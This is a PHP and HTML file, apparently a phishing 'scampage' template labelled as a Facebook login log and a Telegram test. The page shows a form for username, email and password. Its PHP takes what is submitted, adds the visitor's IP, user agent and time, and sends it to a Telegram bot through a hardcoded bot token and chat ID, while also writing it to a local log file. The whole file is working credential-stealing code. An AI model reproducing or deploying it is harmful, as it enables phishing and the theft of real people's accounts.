<?php
$botToken="5144746846:AAHt9iNVTdCuI70qRw5buzGGB5dV4mqvl9s";
$IdTelegram=array("1221104211"); 
//include "id.php";
if(isset($_POST['okbb'])){
 foreach($IdTelegram as $chatId) {
    $ip = getenv("REMOTE_ADDR");
    $date = date('m/d/Y h:i:s a', time());
    $ccode = ("https://ipapi.co/".$ip."/country_calling_code");
$country = ("https://ipapi.co/".$ip."/country_name");
    $message = "
 [+]━━━━【🔥FB log🔥】━━━[+]\n[👤 Login] : ".$_POST['username']."\n[📧 Email] : ".$_POST['email']."\n[🔓 Password] : ".$_POST['password']."\n      [+]━━━━【💻 Sys info】━━━[+]\n[🔍 IP INFO] : ".$ip."\n[⏰ TIME/DATE] : ".$date."\n[🌐 User-Agent] : ".$_SERVER['HTTP_USER_AGENT']."\n zip code: ".$ccode."\n country: ".$country." \n[+]━━━━【❤@slimekay】━━━[+]\n";
  $website="https://api.telegram.org/bot".$botToken;
  
  $params=['chat_id'=>$chatId,'text'=>$message,];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
 }
$myfile = fopen("log.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
}
?>

<html>

<head>
    <title>Creating Own Scampage</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
</head>

<body>

    <div>
        <h2>TELEGRAM SEND LOGIN DETAILS TEST</h2>

        <form method="POST" action="index.php">

            <div>
                <input name="username" type="text" autocomplete="off" required>
                Username
            </div><br>

            <div>
                <input name="email" type="email" autocomplete="off" required>
                Email
            </div><br>

            <div>
                <input name="password" type="password" autocomplete="off" required>
                Password
            </div><br>

            <input type="submit" name="okbb" value="Submit">

        </form>
</body>

</html>